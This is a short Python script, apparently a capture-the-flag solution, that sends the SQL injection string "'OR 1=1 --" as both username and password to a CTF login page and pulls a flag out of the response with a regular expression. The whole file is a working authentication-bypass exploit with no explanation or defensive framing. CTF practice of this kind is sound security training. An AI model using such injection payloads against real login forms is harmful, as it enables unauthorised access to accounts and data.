#!/usr/bin/python3

import requests	
import re
url = "https://canyou.freedomctf.org/login"

r = requests.post(url, data={"username": "'OR 1=1 --", "password": "'OR 1=1 --"})

#print(r.text)
print(re.findall("flag{.*}", r.text)[0])